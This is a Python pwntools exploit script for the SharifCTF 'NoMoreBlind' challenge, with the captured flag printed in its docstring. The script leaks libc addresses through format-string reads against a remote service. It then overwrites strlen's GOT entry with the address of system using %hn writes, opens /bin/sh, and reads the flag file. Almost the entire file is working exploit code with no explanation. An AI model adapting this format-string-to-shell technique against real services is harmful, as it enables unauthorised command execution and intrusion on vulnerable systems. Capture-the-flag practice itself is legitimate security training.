#!/usr/bin/python

"""
$ cat /home/rooney/suctf/NoMoreBlind/flag
SharifCTF{0cc2a912c724c37492df58182c6571c1}

"""

from pwn import *

e = ELF("./libc.so.6")

system = e.symbols["system"]
strlen_got = 0x8049978
fflush_got = 0x8049960
setvbuf_got = 0x8049980
alarm_got = 0x804996c
fgets_got = 0x8049964

r = remote("ctf.sharif.edu", 54518)

r.sendline("%2$x")
r.recvuntil("bytes\n")
leak = int(r.recvline().strip(), 16)

r.sendline(p32(fflush_got)+"%4$s")
r.recvuntil("bytes\n")
a = r.recv(1024).strip()
#print hexdump(a)
a = a[4:]
fflush_leak = u32(a[:4])
print "fflush_leak", hex(fflush_leak)

libc_base = fflush_leak - e.symbols["fflush"]
print "libc_base", hex(libc_base)

system += libc_base + 0x2f0 - 0x10
print "system", hex(system)
system_off_l = system & 0xFFFF
system_off_u = (system >> 16) & 0xFFFF
print "system_offset", hex(system_off_l)
print "system_offset", hex(system_off_u)

r.sendline(p32(strlen_got)+p32(strlen_got+2)+p32(strlen_got+1)+"%{}x%4$hn%{}x%5$hn%6$s".format(system_off_l-0xc, system_off_u-system_off_l))
#r.recvuntil("f7")
r.recv()
#print hexdump(r.recv(1024))

#r.sendline(";/bin/sh;")
r.sendline("/bin/sh;")
r.sendline("cat /home/rooney/suctf/NoMoreBlind/flag")
r.recvuntil("SharifCTF")
print "flag: SharifCTF" + r.recv()
#r.interactive()
r.close()

